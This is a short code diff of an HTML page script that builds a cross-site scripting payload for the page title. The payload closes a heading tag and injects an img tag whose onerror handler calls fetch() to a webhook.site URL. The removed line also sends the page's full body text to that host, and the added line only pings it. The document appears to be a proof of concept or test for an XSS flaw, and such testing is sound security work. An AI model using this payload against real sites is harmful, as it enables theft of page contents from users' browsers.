@@ -8,7 +8,7 @@
 
         <script>
             const webhook = "'https://webhook.site/78be9a55-6ff2-4723-9cf5-c6b3dd95cacc/'";
-            const payloadTitle = "</h1><img src=\"x\" onerror=fetch(" + webhook +"+document.body.textContent)><h1>";
+            const payloadTitle = "</h1><img src=\"x\" onerror=fetch(" + webhook +")><h1>";
             setTimeout(() => {
                 self.title = payloadTitle;
                 document.title = payloadTitle;
